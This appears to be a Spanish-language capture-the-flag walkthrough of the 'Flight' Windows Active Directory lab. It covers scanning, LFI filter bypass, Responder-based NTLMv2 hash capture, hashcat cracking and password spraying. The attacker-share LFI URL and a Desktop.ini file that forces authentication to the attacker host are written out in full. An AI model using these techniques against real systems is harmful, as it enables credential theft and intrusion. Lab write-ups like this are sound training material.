#windows #ActiveDirectory #hard
### Ping

```python
ping -c 1 10.10.11.187
PING 10.10.11.187 (10.10.11.187) 56(84) bytes of data.
64 bytes from 10.10.11.187: icmp_seq=1 ttl=127 time=155 ms

--- 10.10.11.187 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 155.284/155.284/155.284/0.000 ms
```

### TTL = 127 Windows

### nmap

```python
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-10 11:22 EDT
Nmap scan report for 10.10.11.187
Host is up (0.16s latency).
Not shown: 65517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: g0 Aviation
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-10 22:22:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-10T22:23:44
|_  start_date: N/A
|_clock-skew: 6h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.63 seconds
```

### Enumeración del puerto 80 (HTTP)
por el momento no tenemos nada interesante en la pagina web así que seguiremos enumerando.
![[Pasted image 20240810113207.png]]

### Fuzzing con wfuzz
haciendo una enumeración de subdominios logramos encontrar uno llamado `school`
![[Pasted image 20240810114633.png]]

`school`
parece que en la pagina web de `school` tampoco obtenemos nada interesante.
![[Pasted image 20240810114823.png]]

### Enumeración del puerto 53 (DNS)
en esta enumeración nos aseguramos que no existe otro nombre de dominio y también obtenemos la dirección ip V6
![[Pasted image 20240810115616.png]]

### dirsearch
usando `dirsearh` encontramos un `index.php` el cual esta haciendo referencia a una variable `$DATA` esto nos da una pista así que vamos a intentar un `LFI`
![[Pasted image 20240810122957.png]]

`LFI`
al realizar un `LFI` nos reporta que esta actividad es sospechosa y que por ende a sido bloqueada. esto es una buena señal ya que si podemos identificar como se esta realizando este bloqueo podemos intentar bypasearlo
![[Pasted image 20240810123158.png]]

`LFI`
probamos con las rutas absolutas y funciono. parece que esta bloqueando el parámetro `../`
![[Pasted image 20240810123844.png]]

### Fuzzing con wfuzz 
con estos parámetros vamos a realizar un fuzzing con una lista de palabras especificas para Windows.

```python
❯ wfuzz -f ./fuzz-output.csv,csv -c -w file_inclusion_windows.txt --hw 89,95 "http://school.flight.htb/index.php?view=FUZZ"
```

![[Pasted image 20240810124631.png]]

### responder
vamos a iniciar el responder para posteriormente hacer una petición e intentar envenenar el trafico y poder capturar un `hash NTLMv2` 
![[Pasted image 20240810125124.png]]

`hash NTLMv2`
ahora solo vamos a forzar la autenticación contra los recursos compartidos de nuestra maquina atacante navegando a esta dirección `http://school.flight.htb/index.php?view=//10.10.14.8/share` de esta manera la maquina se autentica contra nosotros y podemos capturar el `hash NTLMv2`
![[Pasted image 20240810125817.png]]

### hashcat

![[Pasted image 20240810130537.png]]

`PASS`
después de esperar un rato vemos que hashcat ha podido identificar la contraseña del usuario `svc_apache`
![[Pasted image 20240810131709.png]]

### Validación de credenciales
podemos validar las credenciales que hemos conseguido y parecen ser validas para enumerar los recursos smb pero no podemos conectarnos por `evil-winrm` esto es normal ya que las cuentas de servicios como en este caso no cuentan con esta opción 
![[Pasted image 20240810132329.png]]

### crackmapexec
hacemos una enumeración para obtener usuarios potenciales del sistema.
![[Pasted image 20240810132635.png]]

### crackmapexec
hacemos una validación con la contraseña y la lista de usuarios que hemos conseguido y obtenemos una coincidencia para el usuario `S.Moon` 
![[Pasted image 20240810133411.png]]

### crackmapexec
con este usuario tenemos permisos de lectura y de escritura en el recurso `Shared` lo cual nos permite realizar un nuevo ataque e intentar capturar otro `hash NTLMv2` 
![[Pasted image 20240810134450.png]]

### Responder
en este caso ya que tenemos permisos de escritura en este recurso podemos vamos a crear un archivo que intente llamar el recurso en nuestra maquina para ver si algún otro usuario intenta acceder a este recurso y así poder obtener un segundo hash `NTMLv2` 

primero vamos a crear el archivo `Desktop.ini`
```python
[Shell]
Command=2
IconFile=\\10.10.14.8\share\hello.ico
[Taskbar]
Command=ToggleDesktop
```

ahora vamos a estar a la escucha con el responder y vamos a subir el archivo `Desktop.ini` a los recursos compartidos y esperamos que algún usuario intente conectarse
![[Pasted image 20240810140010.png]]

### crackmapexec
aplicamos los mismos pasos con la herramienta `hashcat` para descifrar el nuevo hash `NTLMv2` y de esta manera obtener las credenciales del usuario c.bum. en este momento con el usuario c.bum podemos leer y escribir en el recurso compartido `Web` por lo que nos vamos a aprovechar de esto.
![[Pasted image 20240810140848.png]]

### smbclient 
una ves dentro de los recursos compartidos de `c.bum` podemos navegar hasta el directorio `Web` y dentro tenemos el directorio `school.flig.htb` en el cual podemos ver los diferentes archivos.
![[Pasted image 20240810141543.png]]

